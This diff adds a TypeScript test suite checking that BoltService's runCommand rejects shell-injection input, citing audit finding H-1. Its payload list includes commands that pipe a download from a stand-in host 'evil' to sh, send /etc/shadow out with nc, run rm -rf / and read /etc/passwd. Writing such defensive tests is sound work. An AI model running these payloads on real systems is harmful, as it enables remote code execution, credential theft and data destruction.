@@ -1237,3 +1237,38 @@ describe("BoltService - Task Error Output Extraction", () => {
     });
   });
 });
+
+describe("BoltService - runCommand shell-metacharacter defense (finding H-1)", () => {
+  let boltService: BoltService;
+
+  beforeEach(() => {
+    boltService = new BoltService("/test/bolt/project", 300000);
+  });
+
+  // Each of these would be interpreted by the remote shell; runCommand must
+  // reject them BEFORE spawning bolt, regardless of caller (batch, re-execute,
+  // or any future path that bypasses the route-level whitelist).
+  const injectionPayloads = [
+    "whoami; curl http://evil/x | sh",
+    "ls && rm -rf /",
+    "echo $(cat /etc/passwd)",
+    "cat /etc/shadow | nc evil 1234",
+    "echo `id`",
+    "ls > /tmp/out",
+    "find / -name '*'",
+  ];
+
+  for (const payload of injectionPayloads) {
+    it(`rejects command with metacharacters: ${payload}`, async () => {
+      await expect(boltService.runCommand("node1", payload)).rejects.toThrow(
+        /shell metacharacters/i,
+      );
+    });
+  }
+
+  it("rejects a command beginning with a dash", async () => {
+    await expect(boltService.runCommand("node1", "--modulepath=/tmp")).rejects.toThrow(
+      /leading '-'/i,
+    );
+  });
+});
